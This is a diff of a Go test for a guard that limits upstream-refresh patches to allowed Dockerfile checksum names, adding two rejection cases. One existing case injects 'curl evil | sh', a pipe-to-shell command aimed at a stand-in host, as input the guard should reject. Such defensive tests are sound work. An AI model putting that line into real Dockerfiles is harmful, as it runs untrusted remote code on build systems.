@@ -159,6 +159,16 @@ func TestUpstreamRefreshScopeGuard(t *testing.T) {
 			patch: scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      CODEX_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
 		},
 		{
+			name:    "cross-product checksum name",
+			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      CLAUDE_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
+			wantErr: "CLAUDE_CODE_MODE_HOST_SHA256",
+		},
+		{
+			name:    "copilot code-mode-host checksum name",
+			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      COPILOT_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
+			wantErr: "COPILOT_CODE_MODE_HOST_SHA256",
+		},
+		{
 			name:    "indented non-checksum Dockerfile line",
 			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "  && old", `  && curl evil | sh`),
 			wantErr: "line +  && curl evil | sh",
